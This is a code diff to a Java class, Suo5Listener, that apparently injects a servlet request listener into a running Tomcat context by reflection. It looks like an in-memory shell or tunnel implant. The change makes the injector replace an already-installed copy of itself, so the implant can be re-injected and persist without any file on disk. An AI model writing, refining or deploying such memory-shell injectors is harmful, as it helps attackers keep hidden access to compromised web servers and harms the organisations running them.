@@ -150,17 +150,41 @@ public class Suo5Listener extends ClassLoader implements ServletRequestListener,
             Method getApplicationEventListenersMethod = standardContext.getClass().getMethod("getApplicationEventListeners");
             Object[] listeners = (Object[]) getApplicationEventListenersMethod.invoke(standardContext);
 
+            String existsMsg = null;
             // 检查是否已存在
+            Object existingListenerObj = null;
             for (Object existingListener : listeners) {
                 if (existingListener instanceof ServletRequestListener && existingListener.getClass().getName().equals(this.getClass().getName())) {
-                    return "Listener already exists";
+                    existsMsg = "Listener already exists, overwriting...";
+                    existingListenerObj = existingListener;
+                    break;
                 }
             }
 
-            // 添加新 Listener
-            Method addApplicationEventListenerMethod = standardContext.getClass().getMethod("addApplicationEventListener", Object.class);
-            addApplicationEventListenerMethod.invoke(standardContext, listener);
+            // 如果已存在，先删除旧的
+            if (existingListenerObj != null) {
+                // 创建新的Listeners数组，排除旧的Listener
+                java.util.List<Object> newListenersList = new java.util.ArrayList<>();
+                for (Object l : listeners) {
+                    if (l != existingListenerObj) {
+                        newListenersList.add(l);
+                    }
+                }
+                // 添加新的Listener
+                newListenersList.add(listener);
 
+                // 设置新的Listeners数组
+                Method setApplicationEventListenersMethod = standardContext.getClass().getMethod("setApplicationEventListeners", Object[].class);
+                setApplicationEventListenersMethod.invoke(standardContext, new Object[]{newListenersList.toArray(new Object[0])});
+            } else {
+                // 添加新 Listener
+                Method addApplicationEventListenerMethod = standardContext.getClass().getMethod("addApplicationEventListener", Object.class);
+                addApplicationEventListenerMethod.invoke(standardContext, listener);
+            }
+
+            if (existsMsg != null) {
+                return existsMsg + " Success";
+            }
             return "Success";
         } catch (Exception e) {
             return "ERROR: " + e.getMessage();
